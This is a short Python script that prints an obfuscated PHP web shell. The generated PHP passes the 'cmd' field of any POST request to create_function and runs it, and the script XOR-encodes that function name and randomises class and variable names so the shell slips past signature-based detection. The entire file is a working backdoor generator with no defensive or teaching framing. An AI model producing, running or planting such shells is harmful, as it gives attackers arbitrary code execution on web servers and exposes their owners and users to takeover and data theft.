import random

func1 = 'create_function'

shell_form ='''<?php
	class {class_name} {{
		function {var_name3}($cmd) {{
        		${var_name1}={func1};
        		${var_name2}=${var_name1}('', $cmd);
			${var_name2}();
		}}
	}}
	${objname}=new {class_name}();
	${objname}->{var_name3}($_POST['cmd']);
?>'''

def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"\x")

def gen_payload(func):
    func_line1 = ''
    func_line2 = ''
    key = random_keys(len(func))
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = '\'{0}\'^"{1}"'.format(func_line1,func_line2)
    return payload

def gen_webshell():
    class_name = random_name(4)
    objname = class_name.lower()
    webshell=shell_form.format(class_name=class_name,func_name=random_name(4),objname=objname,var_name1=random_name(4),var_name2=random_name(4),var_name3=random_name(4),func1=gen_payload(func1))
    print(webshell)

if __name__ == '__main__':
    gen_webshell()
